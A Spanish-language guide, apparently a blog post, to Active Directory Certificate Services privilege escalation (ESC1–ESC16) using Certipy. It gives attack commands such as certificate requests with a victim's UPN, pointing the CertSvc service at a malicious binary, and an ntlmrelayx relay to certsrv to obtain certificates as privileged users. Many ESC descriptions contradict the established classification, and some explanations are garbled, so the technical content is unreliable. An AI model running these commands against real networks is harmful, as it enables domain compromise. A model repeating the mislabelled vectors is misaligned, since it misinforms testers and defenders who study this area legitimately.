# Guía Completa de Privesc de Certificados en Active Directory (ESC1 - ESC16) con Certipy

**Autor:** AnFerCod3  
**Última actualización:** junio 2025

---

## Índice

1. [Introducción](#introducción)
2. [Fundamentos: PKI y ADCS](#fundamentos-pki-y-adcs)
3. [Certipy: Instalación y Uso Básico](#certipy-instalación-y-uso-básico)
4. [Privesc de Certificados en AD: ESC1 a ESC16](#privesc-de-certificados-en-ad-esc1-a-esc16)
    - [ESC1: Plantillas Autenticables](#esc1-plantillas-autenticables)
    - [ESC2: Permisos de Inscripción](#esc2-permisos-de-inscripción)
    - [ESC3: Permisos de Control sobre Plantillas](#esc3-permisos-de-control-sobre-plantillas)
    - [ESC4: Permisos sobre la CA](#esc4-permisos-sobre-la-ca)
    - [ESC5: Control sobre el Servicio](#esc5-control-sobre-el-servicio)
    - [ESC6: Permisos en Enrollment Agents](#esc6-permisos-en-enrollment-agents)
    - [ESC7: Control sobre la CA Root](#esc7-control-sobre-la-ca-root)
    - [ESC8: Control en el Registro](#esc8-control-en-el-registro)
    - [ESC9: Mapeo de Identidad](#esc9-mapeo-de-identidad)
    - [ESC10: Vulnerabilidad en la validación de SAN](#esc10-vulnerabilidad-en-la-validación-de-san)
    - [ESC11: Plantillas con Client Authentication](#esc11-plantillas-con-client-authentication)
    - [ESC12: Control sobre objetos de Plantillas](#esc12-control-sobre-objetos-de-plantillas)
    - [ESC13: Vulnerabilidad en la revocación](#esc13-vulnerabilidad-en-la-revocación)
    - [ESC14: Persistencia en Plantillas](#esc14-persistencia-en-plantillas)
    - [ESC15: Control sobre ADCS Web Enrollment](#esc15-control-sobre-adcs-web-enrollment)
    - [ESC16: Vulnerabilidad en “NTLM Relay” a ADCS](#esc16-vulnerabilidad-en-ntlm-relay-a-adcs)
5. [Recursos y Referencias](#recursos-y-referencias)
6. [Conclusión](#conclusión)

---

## Introducción

Active Directory Certificate Services (ADCS) es el componente de PKI de Microsoft que permite generar, administrar y validar certificados digitales en entornos Windows. Desde hace unos años, las debilidades y configuraciones inseguras en ADCS se han convertido en uno de los vectores de ataque más potentes para escalar privilegios y moverse lateralmente en redes Windows. La comunidad ha clasificado estos vectores como ESC1, ESC2... hasta el más reciente ESC16.

**Certipy** es la herramienta por excelencia para abordar este tipo de ataques, permitiendo identificar, explotar y automatizar las técnicas de privesc en ADCS.

---

## Fundamentos: PKI y ADCS

- **PKI (Public Key Infrastructure):** Infraestructura de clave pública para la gestión de identidad, autenticidad y cifrado.
- **ADCS:** Servicio de CA (Certificate Authority) de Microsoft integrado con Active Directory.
- **Certificados:** Permiten autenticación (SmartCard, Kerberos, EAP), firma y cifrado.
- **Plantillas:** Definen los tipos y configuraciones de certificados que los usuarios/equipos pueden solicitar.

---

## Certipy: Instalación y Uso Básico

Certipy facilita la enumeración y explotación de debilidades en ADCS.

```bash
pip install certipy-ad
```

**Enumeración básica de las CAs y plantillas:**
```bash
certipy find -u user -p password -d domain.local -target dc.domain.local
```

---

## Privesc de Certificados en AD: ESC1 a ESC16

### ESC1: Plantillas Autenticables

**Descripción:**  
Plantillas de certificados configuradas para permitir la autenticación de usuarios, pero sin restricciones en los campos SAN (Subject Alternative Name).

**Por qué funciona:**  
Permiten solicitar un certificado para cualquier usuario, incluso sin privilegios especiales, si la plantilla tiene "ENROLL" permitido para usuarios autenticados y permite modificar el SAN.

**PoC:**
```bash
certipy req -u usuario -p pass -ca CA-Server -template <plantilla> -target <victima> -upn <victima@dominio.local>
```
Con esto, puedes obtener un TGT de Kerberos como la víctima.

---

### ESC2: Permisos de Inscripción

**Descripción:**  
Usuarios sin privilegios pueden inscribirse en plantillas demasiado permisivas.

**Por qué funciona:**  
El grupo "Authenticated Users" tiene derechos de inscripción en plantillas que permiten Client Authentication.

**PoC:**
```bash
certipy req -u usuario -p pass -ca CA-Server -template <plantilla>
# Luego obtener TGT con:
certipy auth -pfx <.pfx obtenido>
```

---

### ESC3: Permisos de Control sobre Plantillas

**Descripción:**  
Si un usuario puede modificar plantillas (ACE de CONTROL), puede alterar sus propiedades para permitir privesc.

**Por qué funciona:**  
Se pueden agregar permisos de inscripción o modificar los EKU (Extended Key Usage) para habilitar Client Authentication.

**PoC:**
```bash
# Modificar la plantilla con PowerShell o ADACLScanner
Set-ADObject -Identity "CN=<plantilla>,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=local" -Add @{...}
```

---

### ESC4: Permisos sobre la CA

**Descripción:**  
Usuarios con permisos de gestión sobre la CA pueden manipular su configuración y plantillas asociadas.

**Por qué funciona:**  
Puede agregar plantillas maliciosas o cambiar la configuración de inscripción.

**PoC:**
```powershell
# Agregar plantilla a la CA
certutil -setcatemplates +<plantilla>
```

---

### ESC5: Control sobre el Servicio

**Descripción:**  
Control sobre el servicio de la CA, como ser miembro del grupo de operadores de CA.

**Por qué funciona:**  
Permite modificar el comportamiento del servicio o reiniciarlo con configuración maliciosa.

**PoC:**
```powershell
# Modificar el binario o configuración del servicio
sc config CertSvc binPath= "C:\ruta\malicioso.exe"
```

---

### ESC6: Permisos en Enrollment Agents

**Descripción:**  
Permisos para inscribir certificados en nombre de otros usuarios.

**Por qué funciona:**  
Permite solicitar certificados de autenticación para cualquier usuario, incluso administradores.

**PoC:**
```bash
certipy req -u usuario -p pass -ca CA-Server -template <EnrollmentAgent>
# Luego usar ese agente para inscribir un certificado para otro usuario privilegiado.
```

---

### ESC7: Control sobre la CA Root

**Descripción:**  
Control o permisos delegados sobre la CA raíz.

**Por qué funciona:**  
Posibilidad de comprometer toda la infraestructura PKI de la organización.

**PoC:**  
Generalmente requiere acceso administrativo sobre el servidor raíz.

---

### ESC8: Control en el Registro

**Descripción:**  
Permisos para modificar claves de registro de la CA.

**Por qué funciona:**  
Se pueden cambiar rutas, configuraciones de seguridad o activar funcionalidades peligrosas.

**PoC:**
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>" /v <clave> /t REG_SZ /d <valor> /f
```

---

### ESC9: Mapeo de Identidad

**Descripción:**  
Mapeo explícito de certificados a cuentas de AD.

**Por qué funciona:**  
Permite autenticarse como otro usuario si se puede modificar el mapeo.

**PoC:**
```powershell
# Modificar el atributo altSecurityIdentities de un usuario en AD
Set-ADUser -Identity usuario -Add @{altSecurityIdentities="X509:<I>...<S>..."}
```

---

### ESC10: Vulnerabilidad en la validación de SAN

**Descripción:**  
Algunas plantillas no restringen adecuadamente el campo SAN, permitiendo suplantar identidades.

**Por qué funciona:**  
El atacante solicita un certificado con el UPN de una cuenta privilegiada.

**PoC:**
```bash
certipy req -u usuario -p pass -ca CA-Server -template <plantilla> -upn <victima@dominio.local>
```

---

### ESC11: Plantillas con Client Authentication

**Descripción:**  
Plantillas configuradas para Client Authentication, sin restricciones adecuadas.

**Por qué funciona:**  
Permite solicitar certificados válidos para autenticación Kerberos.

**PoC:**
```bash
certipy req -u usuario -p pass -ca CA-Server -template <plantilla>
certipy auth -pfx <.pfx obtenido>
```

---

### ESC12: Control sobre objetos de Plantillas

**Descripción:**  
Control sobre los objetos AD que representan las plantillas.

**Por qué funciona:**  
Permite cambiar los permisos de inscripción o los EKU.

**PoC:**
```powershell
Set-ADObject -Identity "CN=<plantilla>,..." -Add @{...}
```

---

### ESC13: Vulnerabilidad en la revocación

**Descripción:**  
Si el atacante puede impedir la revocación de certificados comprometidos.

**Por qué funciona:**  
Permite mantener persistencia usando certificados aun después de ser detectado.

---

### ESC14: Persistencia en Plantillas

**Descripción:**  
Crear o modificar plantillas para permitir persistencia futura (backdoors en plantillas).

**PoC:**  
Agregarse a la ACL de inscripción de una plantilla de uso común.

---

### ESC15: Control sobre ADCS Web Enrollment

**Descripción:**  
Tener control o acceso privilegiado sobre el servicio web de inscripción de certificados.

**Por qué funciona:**  
Permite manipular solicitudes y respuestas de certificados.

---

### ESC16: Vulnerabilidad en “NTLM Relay” a ADCS

**Descripción:**  
El más reciente (2024). Permite relaying de NTLM a los endpoints HTTP de ADCS (certsrv), permitiendo inscribir certificados como usuarios privilegiados si los endpoints no están protegidos.

**Por qué funciona:**  
El endpoint RPC/HTTP de ADCS acepta autenticación NTLM y no implementa protección MS-EFSR, facilitando ataques de relay.

**PoC:**
1. Iniciar un relay con ntlmrelayx:
   ```bash
   ntlmrelayx.py -t http://<CA-Server>/certsrv/certfnsh.asp --adcs
   ```
2. Forzar autenticación (SMB, WebDAV, etc.) de la víctima hacia la máquina del atacante.
3. ntlmrelayx solicitará un certificado en nombre de la víctima.
4. Usar el .pfx obtenido para autenticarse como la víctima:
   ```bash
   certipy auth -pfx <.pfx> -domain <dominio>
   ```

---

## Recursos y Referencias

- [SpecterOps - Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Harmj0y - ADCS Attacks](https://www.harmj0y.net/blog/redteaming/abusing-active-directory-certificate-services/)
- [Certipy GitHub](https://github.com/ly4k/Certipy)
- [NTLM Relay to ADCS](https://research.ifcr.dk/ntlm-relay-to-ad-certificate-services/)
- [ADCS ESC Overview (SpecterOps)](https://github.com/SpecterOps/CertifiedPreOwned/blob/main/ESC.md)

---

## Conclusión

ADCS es una de las superficies de ataque más poderosas y subestimadas en entornos Windows modernos. El abuso de certificados puede llevar a la total toma de control de un dominio. Certipy permite identificar y explotar estas debilidades de manera rápida y efectiva. Es fundamental que los equipos defensivos revisen sus configuraciones y apliquen las recomendaciones de hardening.

---

**¡Recuerda!**  
Utiliza este conocimiento únicamente en entornos de laboratorio o bajo permiso explícito. El abuso indebido de estos vectores puede llevar a consecuencias legales.
